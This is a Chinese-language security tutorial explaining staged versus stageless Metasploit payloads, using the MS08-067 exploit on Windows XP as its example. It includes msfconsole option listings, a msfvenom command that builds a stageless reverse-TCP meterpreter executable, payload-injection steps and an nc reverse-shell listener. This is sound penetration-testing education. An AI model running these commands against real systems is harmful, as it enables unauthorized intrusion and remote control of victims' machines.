***本文作者：你会忘了我，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

​ **你们是否发现msf的payload中，经常会看见一对对长得特别像的兄弟？**

 **​我第一次学习metasploit的时候，可能和大家的开场方式一样，试用08067的漏洞来攻击一台windows xp获取一个meterpreter
shell。那个时候几乎没怎么变过的使用reverse_tcp连接，但是有一天...**

    
    
    payload/windows/x64/meterpreter/reverse_tcp                               normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
    
    payload/windows/x64/meterpreter_reverse_tcp                               normal  No     Windows Meterpreter Shell, Reverse TCP Inline x64
    

​我发现了一对双胞胎，他们长得几乎一模一样，但是我从来没有见过别人使用他的另一个小兄弟，所以这篇文章，我就想和大家聊聊metasploit
payload模式背后的秘密。

​我们就以这个常用的meterpreter
reverse_tcp来举例，其实这两个payload的区别从官方介绍上的话，我们可以发现两个比较重要的词语来阐述他们的不同`inline`和`stager`，其实，用metasploit官方的说法来说，他们第一个payload属于stage模式，第二个payload属于stageless模式，那他们之间具体有什么区别呢？

我们还是使用经典的08067来介绍，下面是我们的模块配置信息：

## Stage

    
    
    msf5 exploit(windows/smb/ms08_067_netapi) > show options 
    
    Module options (exploit/windows/smb/ms08_067_netapi):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------       RHOSTS   192.168.1.2      yes       The target address range or CIDR identifier
       RPORT    445              yes       The SMB service port (TCP)
       SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    Exploit target:
    
       Id  Name
       --  ----       0   Automatic Targeting
    

![Attacking
Mechina](https://image.3001.net/images/20181024/1540360801814.png!small)

当我们使用metasplit的ms08_067_netapi模块之后，使用payload/windows/meterpreter/reverse_tcp模块，并开启一个multi/handler连接监听着我们本机的4444端口，有了解过缓冲区溢出的同学可能都知道，攻击者会利用软件的某个缺陷来传输一段很长的shellcode来溢出目标的缓冲区，从而控制EIP指针来跳转到我们的shellcode上，执行我们的代码，但是这段shellcode并不能过长，shellcode过长，可能会导致覆盖到了上一函数栈帧的数据，导致异常的发生。所以像我们攻击者最希望就是生成一段短小精悍的shellcode啦。

![Attacking
Mechina](https://image.3001.net/images/20181024/15403608293727.png!small)

像这张图，我们攻击机像目标靶机发送了一段shellcode，并覆盖了EIP，导致程序执行的时候跳回shellcode的开头，从而控制程序的执行情况，执行我们的恶意代码，这段恶意代码就只要干两件事，第一件事就是向内存申请开辟一块空间，第二件事就是回连我们的4444端口，这段shellcode为我们干的事情就好像是一个前排冲锋的战士，打开城墙的大门好让更多的精兵冲进来。我们称这段shellcode为stage0，也就是第一阶段

![4](https://image.3001.net/images/20181024/15403608542780.png!small)

这时，我们的攻击机，已经开始监听4444端口了，只要连接一成功，就会把meterpreter shell最核心的dll文件发送到靶机上

![Attacking
Mechina](https://image.3001.net/images/20181024/15403608894740.png!small)

我们之前说过，当靶机运行了我们的shellcode，会在内存里面开辟一块土地，这个地方就是为我们的metsrv留的，metsrv.dll这个文件是meterpreter的核心主件，有了他，我们才能获取到一个meterpreter
shell，当metsrv传输成功之后，shellcode就会把控制权转给metsrv，metsrv这时再去请求另外两个dll文件stdapi和priv。这个时候我们一般就会看到一个让人振奋的提示:

    
    
    msf5 exploit(windows/smb/ms08_067_netapi) > run
    [*] Sending stage (206403 bytes) to 10.73.151.75
    [*] Starting interaction with 1...
    
    meterpreter >
    

![shell
code](https://image.3001.net/images/20181022/1540196848_5bcd89f0d6396.png!small)

## Stageless

现在我们知道了`meterpreter/reverse_tcp`是分阶段的shellcode，并且他分阶段的原因是因为在溢出攻击的时候shellcode应该尽可能保持得更短，这个时候理解他小兄弟`meterpreter_reverse_tcp`就方便的多，和`meterpreter/reverse_tcp`不同的是，他的小兄弟`meterpreter_reverse_tcp`是一个不分阶段的payload，我们称之为stageless(unstage)，他在生成的时候就已经将我们获取一个meterpreter必须要用的stdapi已经包含在其中了。那这又有什么好处呢？试想一下，如果我们通过层层的代理，在内网进行漫游，这个时候使用分阶段的payload如果网络传输出现了问题，metsrv.dll没有加载过去，可能就会错失一个shell，stageless的payload会让人放心不少

默认的stageless
payload只会包含stageless，所以如果想将stdapi和priv两个组建给包含进去的华我们可以用extensions命令：

    
    
    msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
    

## Another Thing

分阶段的payload，我们必须使用exploit/multi/handler这个模块使用，但是当我们想回弹一个基础的shell的时候，其实可以使用nc来监听端口直接回连到nc上，为了测试方便，我直接在已获得session的机器中，注入新的payload来测试：

Target:

    
    
    use exploit/windows/local/payload_inject
    set payload windows/shell_reverse_tcp
    set sessions 1
    set DisablePayloadHandler True (这个设置是让msf不监听端口)
    run
    
    root:~# nc -nvpl 4444
    

![新的payload](https://image.3001.net/images/20181022/1540196880_5bcd8a1095cf2.png!small)

当有时获取到了root权限，想反弹linux
shell的时候，这时meterprter的需求就不是那么高了，我们就可以使用shell_reverse_tcp(或者是bind)来生成一个stageless的bash脚本，直接使用nc来接受shell

## 视频演示:

## 课后作业：

1.在生成一个`windows/shell_reverse_tcp`的时候，是否需要指定EXTENSIONS=stdapi,priv？

2.`meterpreter_reverse_tcp`是否可以不用exploit/multi/hander模块，直接用nc来监听获取？

3.在你只有一个windows的反弹shell的时候，反悔想使用meterpreter的shell了，有什么办法来获取呢？

大家在留言处踊跃留言吧，记得加上自己的思考过程，have fun ^_^

REFERER：

> <https://xz.aliyun.com/t/1709>
>
> <https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-> Mode>

 ***本文作者：你会忘了我，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

